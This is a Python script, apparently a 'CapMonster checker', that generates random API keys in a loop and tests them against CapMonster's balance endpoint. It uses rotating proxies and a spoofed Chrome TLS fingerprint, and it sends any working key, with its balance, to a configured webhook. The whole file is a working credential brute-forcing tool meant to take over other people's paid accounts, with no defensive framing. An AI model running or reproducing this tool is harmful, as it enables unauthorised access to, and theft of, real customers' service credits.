import concurrent.futures
import os;os.system("clear & cls")
import random
import string
import tls_client
requests = tls_client.Session(client_identifier="chrome116",random_tls_extension_order=True)
banner = """

                                           _                   _               _             
                                          | |                 | |             | |            
  ___ __ _ _ __  _ __ ___   ___  _ __  ___| |_ ___ _ __    ___| |__   ___  ___| | _____ _ __ 
 / __/ _` | '_ \| '_ ` _ \ / _ \| '_ \/ __| __/ _ \ '__|  / __| '_ \ / _ \/ __| |/ / _ \ '__|
| (_| (_| | |_) | | | | | | (_) | | | \__ \ ||  __/ |    | (__| | | |  __/ (__|   <  __/ |   
 \___\__,_| .__/|_| |_| |_|\___/|_| |_|___/\__\___|_|     \___|_| |_|\___|\___|_|\_\___|_|   
          | |                                                                                
          |_|                                                                               Author : github.com/Pugn0



"""
print(banner)
# CONFIGURAÇÕES
settings = {
    "webhook_url":"seu_webhook_aqui", # COLOQUE SEU WEBHOOK AQUI
    "threads":5 # THREADS
}

class Checker:
    def __init__(self,proxys):
        self.proxys = proxys
    def check(self):
        key = ''.join(random.choice(string.ascii_lowercase + string.digits + string.digits) for _ in range(32))
        proxy = random.choice(self.proxys) if len(self.proxys) >= 1 else None
        if proxy:
            requests.proxies = {
                "http":f"http://{proxy}",
                "https":f"https://{proxy}"
            }

        try:
            response = requests.post("https://api.capmonster.cloud/getBalance", headers={"Content-Type": "application/json"}, json={"clientKey": key})
            if response.status_code == 200:
                balance = response.json()["balance"]
                print(f"[+] Working Key: {key} <|> Balance: {balance}")
                if settings["webhook_url"].startswith("http"):
                    requests.post(settings["webhook_url"],data={"content":f"**Working Key: `{key}` <|> Balance: `{balance}`**\n***by [Pugno](https://github.com/Pugn0)***","username":"github.com/Pugn0"})
                return 1
            elif "ERROR_KEY_DOES_NOT_EXIST" in response.text:
                print(f"[-] Invalid Key: {key}")
                return 0
            else:
                print(f"[!] Unkown Response | status code : {response.status_code} | Response : {response.text}")
                return 0
        except Exception as e:
            print(f"[!] Error : {e}")
            return 0

def main():
    checker = Checker(proxys=open("proxys.txt").read().splitlines())
    try:
        while True:
            with concurrent.futures.ThreadPoolExecutor(max_workers=2 if settings["threads"] < 2 else settings["threads"]) as s:
                s.submit(checker.check)
    except KeyboardInterrupt:
        exit()

if __name__ == "__main__":
    main()
